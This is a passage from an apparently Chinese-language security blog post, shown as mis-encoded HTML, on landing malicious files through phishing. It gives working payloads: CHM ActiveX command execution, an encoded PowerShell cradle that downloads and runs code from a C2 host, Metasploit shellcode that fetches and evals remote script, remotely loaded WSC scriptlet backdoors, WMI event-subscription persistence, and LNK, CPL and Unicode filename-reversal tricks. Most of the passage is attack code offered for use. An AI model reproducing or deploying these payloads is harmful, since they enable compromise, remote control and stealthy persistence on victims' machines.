<span class="attr">id</span>=<span class="string">x</span> <span class="attr">classid</span>=<span class="string">"clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11"</span> <span class="attr">width</span>=<span class="string">1</span> <span class="attr">height</span>=<span class="string">1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">"Command"</span> <span class="attr">value</span>=<span class="string">"ShortCut"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">"Button"</span> <span class="attr">value</span>=<span class="string">"Bitmap::shortcut"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">"Item1"</span> <span class="attr">value</span>=<span class="string">',calc.exe'</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">"Item2"</span> <span class="attr">value</span>=<span class="string">"273,1,1"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">OBJECT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">x.Click();</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>å¯æ‰§è¡Œcalc.exe<br>æ›¿æ¢ä¸ºå¯¹åº”jsä»£ç å³å¯<br>ä¾‹å¦‚ï¼š<br>è¿œç¨‹DownloadString JSRA å›è¿C2<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -ep bypass -enc PQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7AC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsASQBFAFgAIAAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAuADEAMAAzADoAOAAwADgAMQAvADEALwAnACkAOwAKAA==</span><br></pre></td></tr></table></figure></p>
<h3 id="ç”Ÿæˆ-Shellcode"><a href="#ç”Ÿæˆ-Shellcode" class="headerlink" title="ç”Ÿæˆ Shellcode"></a>ç”Ÿæˆ Shellcode</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">msf5 payload(windows/messagebox) &gt; use windows/<span class="built_in">exec</span></span><br><span class="line"></span><br><span class="line">msf5 payload(windows/<span class="built_in">exec</span>) &gt; <span class="built_in">set</span> CMD rundll32.exe javascript:\<span class="string">"\\..\\mshtml,RunHTMLApplication \";document.write();h=new%20ActiveXObject(\"WinHttp.WinHttpRequest.5.1\");h.Open(\"GET\",\"http://192.168.174.136/connect\",false);try&#123;h.Send();B=h.ResponseText;eval(B);&#125;catch(e)&#123;new%20ActiveXObject(\"WScript.Shell\").Run(\"cmd /c taskkill /f /im rundll32.exe\",0,true);&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">msf5 payload(windows/exec) &gt; generate -f c</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/*</span></span><br><span class="line"><span class="string"> * windows/exec - 500 bytes</span></span><br><span class="line"><span class="string"> * http://www.metasploit.com</span></span><br><span class="line"><span class="string"> * VERBOSE=false, PrependMigrate=false, EXITFUNC=process,</span></span><br><span class="line"><span class="string"> * CMD=rundll32.exe javascript:"</span>\..\mshtml,RunHTMLApplication</span><br><span class="line"><span class="string">";document.write();h=new%20ActiveXObject("</span>WinHttp.WinHttpRequest.5.1<span class="string">");h.Open("</span>GET<span class="string">","</span>http://192.168.174.136/connect<span class="string">",false);try&#123;h.Send();B=h.ResponseText;eva * l(B);&#125;catch(e)&#123;new%20ActiveXObject("</span>WScript.Shell<span class="string">").Run("</span>cmd</span><br><span class="line"> * /c taskkill /f /im rundll32.exe<span class="string">",0,true);&#125;</span></span><br><span class="line"><span class="string"> */</span></span><br><span class="line"><span class="string">unsigned char buf[] =</span></span><br><span class="line"><span class="string">"</span>\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x00\x53\xff\xd5\x72\x75\x6e\x64\x6c\x6c\x33\x32\x2e\x65\x78<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x65\x20\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3a\x22\x5c<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x2e\x2e\x5c\x6d\x73\x68\x74\x6d\x6c\x2c\x52\x75\x6e\x48\x54<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x4d\x4c\x41\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x20\x22<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x3b\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x77\x72\x69\x74\x65<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x28\x29\x3b\x68\x3d\x6e\x65\x77\x25\x32\x30\x41\x63\x74\x69<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x76\x65\x58\x4f\x62\x6a\x65\x63\x74\x28\x22\x57\x69\x6e\x48<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x74\x74\x70\x2e\x57\x69\x6e\x48\x74\x74\x70\x52\x65\x71\x75<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x65\x73\x74\x2e\x35\x2e\x31\x22\x29\x3b\x68\x2e\x4f\x70\x65<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x6e\x28\x22\x47\x45\x54\x22\x2c\x22\x68\x74\x74\x70\x3a\x2f<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x2f\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x37\x34\x2e\x31\x33<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x36\x2f\x63\x6f\x6e\x6e\x65\x63\x74\x22\x2c\x66\x61\x6c\x73<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x65\x29\x3b\x74\x72\x79\x7b\x68\x2e\x53\x65\x6e\x64\x28\x29<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x3b\x42\x3d\x68\x2e\x52\x65\x73\x70\x6f\x6e\x73\x65\x54\x65<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x78\x74\x3b\x65\x76\x61\x6c\x28\x42\x29\x3b\x7d\x63\x61\x74<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x63\x68\x28\x65\x29\x7b\x6e\x65\x77\x25\x32\x30\x41\x63\x74<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x69\x76\x65\x58\x4f\x62\x6a\x65\x63\x74\x28\x22\x57\x53\x63<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x72\x69\x70\x74\x2e\x53\x68\x65\x6c\x6c\x22\x29\x2e\x52\x75<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x6e\x28\x22\x63\x6d\x64\x20\x2f\x63\x20\x74\x61\x73\x6b\x6b<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x69\x6c\x6c\x20\x2f\x66\x20\x2f\x69\x6d\x20\x72\x75\x6e\x64<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x6c\x6c\x33\x32\x2e\x65\x78\x65\x22\x2c\x30\x2c\x74\x72\x75<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x65\x29\x3b\x7d\x00<span class="string">";</span></span><br></pre></td></tr></table></figure>
<h2 id="0x03-WSC"><a href="#0x03-WSC" class="headerlink" title="0x03 WSC"></a>0x03 WSC</h2><p>WSC ï¼š Windows Script<br>WSCæ˜¯å¾®è½¯æä¾›å¿«é€Ÿåˆ›å»ºCOMç»„å»ºçš„é€”å¾„<br>ä¹‹å‰lcxå¸ˆå‚…å¾ˆç«çš„ä¸€ç¯‡æ–‡ç« ï¼š <a href="http://huaidan.org/archives/2574.html" target="_blank" rel="noopener">åˆ©ç”¨wscåˆ›å»ºaspåé—¨</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;    </span><br><span class="line"></span><br><span class="line">&lt;package&gt;</span><br><span class="line">&lt;component id=&quot;testCalc&quot;&gt;    </span><br><span class="line"></span><br><span class="line">&lt;script language=&quot;JScript&quot;&gt;</span><br><span class="line">&lt;![CDATA[</span><br><span class="line">var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc.exe&quot;); </span><br><span class="line">]]&gt;</span><br><span class="line">&lt;/script&gt;    </span><br><span class="line"></span><br><span class="line">&lt;/component&gt;</span><br><span class="line">&lt;/package&gt;</span><br></pre></td></tr></table></figure>
<p>JSæ–‡ä»¶åªéœ€è°ƒç”¨wscå³å¯<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GetObject(<span class="string">"script:C:\\testwsc\\test.wsc"</span>);</span><br></pre></td></tr></table></figure></p>
<p>ä¹Ÿå¯è¿›è¡Œè¿œç¨‹è°ƒç”¨<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GetObject(<span class="string">"script:https://raw.githubusercontent.com/patrilic/Backdoors/master/Wsc_backdoor/test.wsc"</span>)</span><br></pre></td></tr></table></figure></p>
<h2 id="0x04-WMI-Backdoor"><a href="#0x04-WMI-Backdoor" class="headerlink" title="0x04 WMI Backdoor"></a>0x04 WMI Backdoor</h2><p><a href="http://www.anquan.us/static/drops/tips-8260.html" target="_blank" rel="noopener">WMI Backdoor - wooyun Drops</a></p>
<h4 id="powershell-åˆ©ç”¨"><a href="#powershell-åˆ©ç”¨" class="headerlink" title="powershell åˆ©ç”¨"></a>powershell åˆ©ç”¨</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ä¸åœ¨Clientå’ŒServerç•™ä¸‹ä»»ä½•æ–‡ä»¶</span><br><span class="line">ä¸æ”¹åŠ¨æ³¨å†Œè¡¨</span><br><span class="line">ä»…ä½¿ç”¨powershellå®ç°</span><br></pre></td></tr></table></figure>
<p><strong>åˆ©ç”¨wmiæ— æ–‡ä»¶å­˜å‚¨payload</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$StaticClass = New-Object Management.ManagementClass(&apos;root\cimv2&apos;, $null,</span><br><span class="line">$null)</span><br><span class="line">$StaticClass.Name = &apos;Win32_EvilClass&apos;</span><br><span class="line">$StaticClass.Put()</span><br><span class="line">$StaticClass.Properties.Add(&apos;EvilProperty&apos; , &quot;This is payload&quot;)</span><br><span class="line">$StaticClass.Put()</span><br></pre></td></tr></table></figure></p>
<h4 id="powershell-è°ƒç”¨-javascript-backdoor"><a href="#powershell-è°ƒç”¨-javascript-backdoor" class="headerlink" title="powershell è°ƒç”¨ javascript_backdoor"></a>powershell è°ƒç”¨ javascript_backdoor</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$filterName = &apos;filtP1&apos;</span><br><span class="line">$consumerName = &apos;consP1&apos;</span><br><span class="line">$Command =&quot;GetObject(&quot;&quot;script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test&quot;&quot;)&quot;    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$Query = &quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA &apos;Win32_PerfFormattedData_PerfOS_System&apos;&quot;    </span><br><span class="line"></span><br><span class="line">$WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace &quot;root\subscription&quot; -Arguments @&#123;Name=$filterName;EventNameSpace=&quot;root\cimv2&quot;;QueryLanguage=&quot;WQL&quot;;Query=$Query&#125; -ErrorAction Stop    </span><br><span class="line"></span><br><span class="line">$WMIEventConsumer = Set-WmiInstance -Class ActiveScriptEventConsumer -Namespace &quot;root\subscription&quot; -Arguments @&#123;Name=$consumerName;ScriptingEngine=&apos;JScript&apos;;ScriptText=$Command&#125;    </span><br><span class="line"></span><br><span class="line">Set-WmiInstance -Class __FilterToConsumerBinding -Namespace &quot;root\subscription&quot; -Arguments @&#123;Filter=$WMIEventFilter;Consumer=$WMIEventConsumer&#125;</span><br></pre></td></tr></table></figure>
<h4 id="mof-è°ƒç”¨-javascript-backdoor"><a href="#mof-è°ƒç”¨-javascript-backdoor" class="headerlink" title="mof è°ƒç”¨ javascript_backdoor"></a>mof è°ƒç”¨ javascript_backdoor</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pragma namespace(&quot;\\\\.\\root\\subscription&quot;)    </span><br><span class="line"></span><br><span class="line">instance of __EventFilter as $EventFilter</span><br><span class="line">&#123;</span><br><span class="line">    EventNamespace = &quot;Root\\Cimv2&quot;;</span><br><span class="line">    Name  = &quot;filtP1&quot;;</span><br><span class="line">    Query = &quot;Select * From __InstanceModificationEvent &quot;</span><br><span class="line">            &quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;</span><br><span class="line">            &quot;And TargetInstance.Second = 1&quot;;</span><br><span class="line">    QueryLanguage = &quot;WQL&quot;;</span><br><span class="line">&#125;;    </span><br><span class="line"></span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer</span><br><span class="line">&#123;</span><br><span class="line">    Name = &quot;consP1&quot;;</span><br><span class="line">    ScriptingEngine = &quot;JScript&quot;;</span><br><span class="line">    ScriptText = &quot;GetObject(\&quot;script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test\&quot;)&quot;;</span><br><span class="line">&#125;;    </span><br><span class="line"></span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123;</span><br><span class="line">    Consumer   = $Consumer;</span><br><span class="line">    Filter = $EventFilter;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>ç±»ä¼¼çš„ï¼Œä¹Ÿå¯ä»¥åˆ©ç”¨wmiæ‰§è¡Œå…¶ä»–åé—¨ç¨‹åºï¼Œé…åˆä½¿ç”¨</p>
<p>å…·ä½“çš„å¯ä»¥çœ‹è¿™ç¯‡<br><a href="http://www.anquan.us/static/drops/tips-8260.html" target="_blank" rel="noopener">http://www.anquan.us/static/drops/tips-8260.html</a></p>
<p>åŒæ—¶wmiä¹Ÿå¯ä½¿ç”¨ </p>
<blockquote>
<p>vbs<br>mof<br>C / C++<br>.Net<br>ç­‰æ–¹å¼è¿›è¡Œæ‰§è¡Œ </p>
</blockquote>
<h2 id="0x05-Lnk-Backdoor"><a href="#0x05-Lnk-Backdoor" class="headerlink" title="0x05 Lnk Backdoor"></a>0x05 Lnk Backdoor</h2><p>å¯å‚è€ƒevi1cgå¸ˆå‚…çš„æ–‡ç« -&gt;<a href="https://evi1cg.me/archives/Shortcut_Backdoor.html" target="_blank" rel="noopener">Shortcut_Backdoor</a><br>å¿«æ·æ–¹å¼ä¼šæ‰§è¡Œç›®æ ‡é‡Œçš„æ–‡ä»¶<br><img src="/Phishing Attack - æ–‡ä»¶è½åœ°.resources/7092550A-0CF0-42AE-96C7-E41A769063B2.png" alt="e6661303d9cae03727399d7ada045593"></p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Shortcut_gen.exe test.txt test.lnk</span><br></pre></td></tr></table></figure>
<p>è¿™æ ·ç‚¹å‡»test.lnk å°±ä¼šæ‰§è¡Œtest.txtä¸­çš„å‘½ä»¤</p>
<p>ä¹Ÿå¯ä»¥ä½¿ç”¨evi1cgå¸ˆå‚…çš„è„šæœ¬-&gt;<a href="https://gist.github.com/Ridter/a360f94d8ac9a8c30227e3812dfbb329" target="_blank" rel="noopener">https://gist.github.com/Ridter/a360f94d8ac9a8c30227e3812dfbb329</a></p>
<h2 id="0x06-Chm-Backdoor"><a href="#0x06-Chm-Backdoor" class="headerlink" title="0x06 Chm Backdoor"></a>0x06 Chm Backdoor</h2><p>é€šç”¨ä»¥ä¸Š #åˆ©ç”¨ CHM åŠ è½½ JS<br>ä¸å•å¯åˆ©ç”¨JSè¿›è¡Œæ‰§è¡Œ<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Mousejack replay&lt;/title&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;</span><br><span class="line">command exec </span><br><span class="line">&lt;OBJECT id=x classid=&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot; width=1 height=1&gt;</span><br><span class="line">&lt;PARAM name=&quot;Command&quot; value=&quot;ShortCut&quot;&gt;</span><br><span class="line"> &lt;PARAM name=&quot;Button&quot; value=&quot;Bitmap::shortcut&quot;&gt;</span><br><span class="line"> &lt;PARAM name=&quot;Item1&quot; value=&apos;,calc.exe&apos;&gt;</span><br><span class="line"> &lt;PARAM name=&quot;Item2&quot; value=&quot;273,1,1&quot;&gt;</span><br><span class="line">&lt;/OBJECT&gt;</span><br><span class="line">&lt;SCRIPT&gt;</span><br><span class="line">x.Click();</span><br><span class="line">&lt;/SCRIPT&gt;</span><br><span class="line">&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
<p>åˆ©ç”¨Objectæ ‡ç­¾ï¼Œå¯æ‰§è¡Œå„ç±»shellcode<br>æ¯”å¦‚åˆ©ç”¨regsvr32 æ‰§è¡Œdllï¼Œåˆ©ç”¨mshtaæ‰§è¡Œhtaï¼Œç›´æ¥è¿è¡Œpowershellï¼ŒVBSç­‰ç­‰<br>å‰æå½“ç„¶æ˜¯åšå¥½æ··æ·†å’Œå…æ€</p>
<h2 id="0x07-CPL-Backdoor"><a href="#0x07-CPL-Backdoor" class="headerlink" title="0x07 CPL Backdoor"></a>0x07 CPL Backdoor</h2><p>CPL (Control Panel Item)<br>CPLæ–‡ä»¶æœ¬è´¨ä¸Šæ˜¯DLLï¼Œ ä½†æ˜¯ç”±äºä»–åŒ…å«CPLAppletå‡½æ•°ï¼Œæ‰€ä»¥æˆä¸ºäº†ä¸€ä¸ªwindowså¯æ‰§è¡Œæ–‡ä»¶<br>ä½†æ˜¯è™½ç„¶æ˜¯å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå…¶å®æ˜¯è°ƒç”¨shell32.dll æ¥è¿è¡Œ<br>è°ƒç”¨çš„å‡ ç§æ–¹å¼:</p>
<p><strong>åˆ©ç”¨vbsè°ƒç”¨cpl</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Dim obj</span><br><span class="line">Set obj = CreateObject(&quot;Shell.Application&quot;)</span><br><span class="line">obj.ControlPanelItem(&quot;test.cpl&quot;)</span><br></pre></td></tr></table></figure></p>
<p><strong>åˆ©ç”¨jsè°ƒç”¨cpl</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var a = new ActiveXObject(&quot;Shell.Application&quot;);</span><br><span class="line">a.ControlPanelItem(&quot;c:\\test\\test.cpl&quot;);</span><br></pre></td></tr></table></figure></p>
<p>åŒæ ·ï¼Œå…¶å®å¯ä»¥ç›´æ¥ç”¨msfç”Ÿæˆä¸€ä¸ªdllæ–‡ä»¶ï¼Œç„¶åä¿®æ”¹åç¼€ä¸º.cplå³å¯ï¼Œä½†æ˜¯å­˜åœ¨ä¸€ä¸ªå¼¹çª—æç¤ºç¨‹åºå…¼å®¹æ€§é—®é¢˜<br>è§£å†³æ–¹å¼ï¼šæ‰‹åŠ¨ç¼–è¯‘reverse_tcp</p>
<p>å‚è€ƒï¼š<a href="http://www.anquan.us/static/drops/tips-16042.html" target="_blank" rel="noopener">http://www.anquan.us/static/drops/tips-16042.html</a></p>
<h2 id="0x08-Windows-åˆ©ç”¨Unicode-æ–‡ä»¶ååè½¬"><a href="#0x08-Windows-åˆ©ç”¨Unicode-æ–‡ä»¶ååè½¬" class="headerlink" title="0x08 Windows åˆ©ç”¨Unicode æ–‡ä»¶ååè½¬"></a>0x08 Windows åˆ©ç”¨Unicode æ–‡ä»¶ååè½¬</h2><p>ç›¸å½“ç®€å•..<br><img src="/Phishing Attack - æ–‡ä»¶è½åœ°.resources/0BB5918F-F0DC-4CED-B0BE-56F421ABA477.png" alt="723d43d4d266bfe5a3c58768d476d090"></p>
<p>æ’å…¥RLOå­—ç¬¦å°±å¯ä»¥è¿›è¡Œæ–‡ä»¶ååè½¬ï¼Œç„¶åå¯ä»¥æ¢å›¾ç‰‡æ¥æ›´å¥½çš„ä¼ªè£…<br><img src="/Phishing Attack - æ–‡ä»¶è½åœ°.resources/76864B14-46A1-4586-BC1E-2A104295BA7C.png" alt="5633fd5aa8a0e32749abe83665490e9c"></p>
<h2 id="0x09-Winrar-Backdoor"><a href="#0x09-Winrar-Backdoor" class="headerlink" title="0x09 Winrar Backdoor"></a>0x09 Winrar Backdoor</h2><p>è‘—åçš„<code>CVE-2018-20250</code><br>è¿˜æ²¡åˆ†æè¿‡åŸç†..çŒ®ä¸Šå­¦é•¿çš„Exp<br><a href="https://github.com/WyAtu/CVE-2018-20250" target="_blank" rel="noopener">https://github.com/WyAtu/CVE-2018-20250</a></p>
<h2 id="0x10-CVE-2018-4878"><a href="#0x10-CVE-2018-4878" class="headerlink" title="0x10 CVE-2018-4878"></a>0x10 CVE-2018-4878</h2><p>å½±å“ç‰ˆæœ¬ï¼š<br><code>version &lt;= 28.0.0.137</code><br>flask æº¢å‡ºï¼Œé…åˆè„šæœ¬è¿›è¡Œæ”»å‡»å°±è¡Œ..ç°åœ¨h5ç››è¡Œï¼Œflashä¹Ÿå¿«é€€ä¼‘äº†</p>
<h2 id="0x11-Nginx-åå‘ä»£ç†"><a href="#0x11-Nginx-åå‘ä»£ç†" class="headerlink" title="0x11 Nginx åå‘ä»£ç†"></a>0x11 Nginx åå‘ä»£ç†</h2><p>æ¨ä¸€æ³¢passer6y<br><a href="https://www.anquanke.com/post/id/150436" target="_blank" rel="noopener">https://www.anquanke.com/post/id/150436</a><br>å¤§æ¦‚å°±æ˜¯æ³¨å†Œä¸€ä¸ªç›¸è¿‘çš„åŸŸåï¼Œç„¶ååä»£çœŸå®æœåŠ¡å™¨ï¼Œæˆªæ–­æ˜æ–‡å¯†ç ï¼Œè¿›è¡Œé’“é±¼ï¼Œå•ç‹¬åˆ†æä¸€æ³¢  # Nginx åå‘ä»£ç†å®æˆ˜</p>
</div><div class="tags"><a href="/tags/Backdoor/">Backdoor</a></div><div class="post-nav"><a class="pre" href="/2019/07/28/CISCN 2019 Final Web11/">CISCN 2019 Final Web11 èµ›åå¤ç›˜</a><a class="next" href="/2019/06/10/CISCN2019-è¥¿å—èµ›åŒºéƒ¨åˆ†Webé¢˜è§£/">CISCN2019-è¥¿å—èµ›åŒºéƒ¨åˆ†Webé¢˜è§£</a></div><div id="disqus_thread"><div class="btn_click_load"><button class="disqus_click_btn">é˜…è¯»è¯„è®ºï¼ˆè¯·ç¡®ä¿ Disqus å¯ä»¥æ­£å¸¸åŠ è½½ï¼‰</button></div><script type="text/javascript">var disqus_config = function () {
    this.page.url = 'http://patrilic.top/2019/07/18/Phishing Attack - æ–‡ä»¶è½åœ°/';
    this.page.identifier = '2019/07/18/Phishing Attack - æ–‡ä»¶è½åœ°/';
    this.page.title = 'Phishing Attack - æ–‡ä»¶è½åœ°';
  };</script><script type="text/javascript" id="disqus-lazy-load-script">$.ajax({
url: 'https://disqus.com/next/config.json',
timeout: 2500,
type: 'GET',
success: function(){
  var d = document;
  var s = d.createElement('script');
  s.src = '//Patrilic.disqus.com/embed.js';
  s.setAttribute('data-timestamp', + new Date());
  (d.head || d.body).appendChild(s);
  $('.disqus_click_btn').css('display', 'none');
},
error: function() {
  $('.disqus_click_btn').css('display', 'block');
}
});</script><script type="text/javascript" id="disqus-click-load">$('.btn_click_load').click(() => {  //click to load comments
    (() => { // DON'T EDIT BELOW THIS LINE
        var d = document;
        var s = d.createElement('script');
        s.src = '//Patrilic.disqus.com/embed.js';
        s.setAttribute('data-timestamp', + new Date());
        (d.head || d.body).appendChild(s);
    })();
    $('.disqus_click_btn').css('display','none');
